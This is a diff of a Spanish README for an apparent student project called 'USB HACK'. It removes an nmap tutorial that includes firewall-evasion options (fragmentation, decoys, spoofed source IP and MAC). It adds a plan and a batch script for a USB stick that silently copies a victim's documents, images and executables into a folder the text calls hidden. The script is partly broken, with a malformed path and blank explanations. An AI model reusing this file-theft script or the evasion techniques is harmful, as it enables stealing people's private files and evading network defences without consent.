@@ -1,27 +1,14 @@
 Proyecto USB HACK
 
-Tutorial de uso de la herramienta NMAP
+Vamos a realizar una USB que robe lo datos de cualquier usuario para ello vamos a realizar un script 
+para que se copie los archivo de la victima y luego se creara una carpeta oculta dentro de la USB donde guardara todo esos archivos.
 
-Si queremos analizar una ip el comando es nmap IP
-Si queremos analizar un rango de IPs es nmap IP-rango
-Si es una web el comando es nmap url
-Si es una ip con la mascara es IP/mask
--PS n (envía un TCP SYN al puerto 80 por defecto para descubrir hosts levantados, «n» puede ser otro puerto o puertos a probar)
--PA n (envía un TCP ACK al puerto 80 por defecto para descubrir hosts levantados, «n» puede ser otro puerto o puertos a probar)
--PU n (envía un datagrama UDP al puerto 40125 por defecto para descubrir hosts levantados, «n» puede ser otro puerto o puertos a probar)
--sL (no escanea, únicamente lista los objetivos)
--PO (ping por protocolo)
--PN (No hacer ping)
--n (no hacer DNS)
--R (Resolver DNS en todos los sistemas objetivo)
-–traceroute (trazar ruta al sistema (para topologías de red))
--sP (realizar ping, igual que con –PP –PM –PS443 –PA80)
+El script que vamos a utilizar es 
+@shift /0 --->  Sirve para acceder a parametros que esten despues de la novena posición y támbien puede mostrar parametros que pueden o no pueden estar presente
+@echo off ---> 
+IF NOT EXIST ".\Datos" MD ".\Datos" ---> 
+cd .\Datos --->
+for /R C:Users\Admin\Desktop %%x in (*.pdf *.pptx *.jpg *.jpeg *.png *.bmp *.exe *.mp4) do copy "%%x" ".\" ---> 
 
-Para evadir cortafuegos
--f (fragmentar paquetes)
--D d1,d2 (encubrir análisis con señuelos)
--S ip (falsear dirección origen)
-–g source (falsear puerto origen)
-–randomize-hosts orden
-–spoof-mac mac (cambiar MAC de origen)
 
+exit? ---> 
